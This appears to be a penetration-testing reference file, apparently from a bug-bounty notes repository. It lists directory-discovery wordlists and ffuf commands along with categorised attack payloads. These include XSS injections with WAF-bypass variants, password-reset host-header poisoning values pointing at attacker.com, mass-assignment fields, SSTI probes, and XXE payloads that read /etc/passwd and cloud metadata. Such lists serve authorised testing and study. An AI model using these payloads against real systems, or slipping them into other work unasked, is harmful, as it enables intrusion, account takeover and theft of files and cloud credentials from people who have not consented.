# Wordlists and Payload Lists

## Overview
A curated reference of wordlists and payload lists organized by vulnerability type and use case. Each section explains when to use the list and how to apply it effectively.

## Directory and File Discovery

### General purpose
| Wordlist | Location | When to use |
|----------|----------|-------------|
| `dirb/big.txt` | `/usr/share/wordlists/dirb/big.txt` | Default starting point for directory scanning |
| `dirb/common.txt` | `/usr/share/wordlists/dirb/common.txt` | Quick scan, smaller list |
| `raft-large-directories.txt` | SecLists Discovery | Comprehensive directory list |
| `raft-large-files.txt` | SecLists Discovery | File-specific discovery |

### Admin panels
| Wordlist | Location |
|----------|----------|
| `admin-panels.txt` | `/usr/share/seclists/Discovery/Web-Content/admin-panels.txt` |

### API endpoints
| Wordlist | Location | When to use |
|----------|----------|-------------|
| `api-endpoints.txt` | SecLists Discovery/Web-Content/api/ | General API routes |
| `api-seen-in-wild.txt` | SecLists Discovery/Web-Content/api/ | Real-world observed API paths |

```bash
# Usage examples
ffuf -w /usr/share/wordlists/dirb/big.txt -u https://target.com/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -u https://target.com/FUZZ
```

## Technology-Specific Lists

### WordPress
```bash
# WPScan handles its own wordlists for:
wpscan --url https://target.com --enumerate p,t,tt,u
# p = plugins, t = themes, tt = timthumbs, u = users
```

### Git/version control
| Wordlist | Purpose |
|----------|---------|
| `git-recon.txt` | SecLists — finds exposed `.git/`, `.svn/`, `.env` files |

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/git-recon.txt -u https://target.com/FUZZ
```

### Swagger / API documentation
```bash
echo -e "swagger\napi-docs\ndocs\nopenapi.json\nswagger-ui\nswagger.json\napi/swagger" > swagger_paths.txt
ffuf -w swagger_paths.txt -u https://target.com/FUZZ
```

### SOAP / WSDL
```bash
echo -e "wsdl\nservice.wsdl\nws\nwebservice\nsoap" > soap_paths.txt
ffuf -w soap_paths.txt -u https://target.com/FUZZ
```

## XSS Payloads (categorized)

### HTML context — basic tag injection
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
```

### Attribute context — breakout
```html
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
"><img src=x onerror=alert(1)>
```

### JavaScript context
```javascript
';alert(1);//
</script><script>alert(1)</script>
```

### WAF bypass payloads
```html
<!-- Case variation -->
<ImG sRc=x oNeRrOr=alert(1)>

<!-- Null bytes / whitespace -->
<img%0asrc=x%0aonerror=alert(1)>
<dETAILS%0aopen%0aonToGgle%0a=%0aalert(1)%20x>

<!-- HTML entity encoding -->
<a href="javascript&#58;alert(1)">click</a>

<!-- Unicode in JS context -->
window['al\u0065rt'](1)

<!-- Popover-based (HTML 2024+) -->
<button popovertarget=x>Click</button>
<input type="hidden" popover id=x onbeforetoggle=alert(1)>

<!-- Template/textarea escape -->
</template></textarea></noscript></title></style></script>--><svg onload=alert(1)>
```

### Email field injection
```
test@target.com'\""><svg/onload=alert(/xss/)>
"><iframe/onload=eval(atob(location.hash.substring(1)))>"@target.com
```

### Alert alternatives (when `alert` is blocked)
```javascript
confirm(1)
prompt(1)
print()
eval(atob('YWxlcnQoMSk='))
Reflect.get(frames,'alert')(1)
alert.bind()(1)
```

## Mass Assignment Fields

Common field names to inject into JSON APIs:
```
role, roles, is_admin, is_staff, is_superuser
price, item_price, discount, percentage, total
status, state, approved, verified
user_id, account_id, org_id
```

## Password Reset Testing Values

```
# Host header poisoning
X-Forwarded-Host: attacker.com
X-Forwarded-For: attacker.com
Origin: attacker.com

# Email parameter pollution
{"email":"victim@target.com","email":"attacker@target.com"}
{"email":["victim@target.com","attacker@target.com"]}
```

See `techniques/password-reset-abuse.md` for the full methodology.

## SSTI Detection Strings

```
{{7*7}}          → 49  (Jinja2, Twig)
${7*7}           → 49  (Freemarker, Velocity)
<%= 7*7 %>       → 49  (ERB/Ruby)
#{7*7}           → 49  (Pebble, Thymeleaf)
${{7*7}}         → 49  (AngularJS)
{{7*'7'}}        → 7777777 (Jinja2 string multiplication)
```

## XXE Standard Payloads

```xml
<!-- File read -->
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- SSRF -->
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>
```

See `techniques/xxe-injection.md` for the full methodology.

## Custom Wordlist Generation

### Using WaerJScan
Crawl a target and generate a custom wordlist from JavaScript analysis:
- Extracts endpoints, parameters, emails, API keys, and interesting strings.
- Generates TF-IDF and n-gram based wordlists.
- Output: `custom_wordlist.txt`, `endpoints.txt`, `parameters.txt`.

See `methodology/javascript-endpoint-discovery.md` for details.

## References

- `techniques/xss-techniques.md`
- `techniques/password-reset-abuse.md`
- `techniques/xxe-injection.md`
- `techniques/mass-assignment-vulnerabilities.md`
- `tools/recon-tools.md`
